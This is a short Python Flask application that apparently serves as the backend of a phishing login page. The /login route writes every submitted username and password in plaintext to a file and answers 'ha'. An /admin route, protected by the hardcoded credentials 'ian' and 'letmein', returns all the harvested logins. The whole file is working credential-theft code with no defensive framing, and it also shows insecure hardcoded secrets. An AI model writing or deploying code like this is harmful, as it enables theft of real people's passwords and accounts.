from flask import Flask, render_template, request
app = Flask(__name__)

@app.route("/")
def index():
    return render_template('login.html', action='login')

@app.route("/login", methods=["POST"])
def login():
    username = request.form["username"]
    password = request.form["password"]
    with open("data.txt", "a") as f:
        f.write("Username: {} \nPassword: {}\n\n\n".format(username, password))
        f.close()
    return "ha"

@app.route("/admin", methods=["POST", "GET"])
def admin():
    if request.method == 'GET':
        return render_template('login.html', action='admin')
    elif request.method == "POST":
        if request.form['username'] == "ian" and request.form['password'] == 'letmein':
            with open('data.txt', 'r') as f:
                text = f.read()
                f.close()
                return text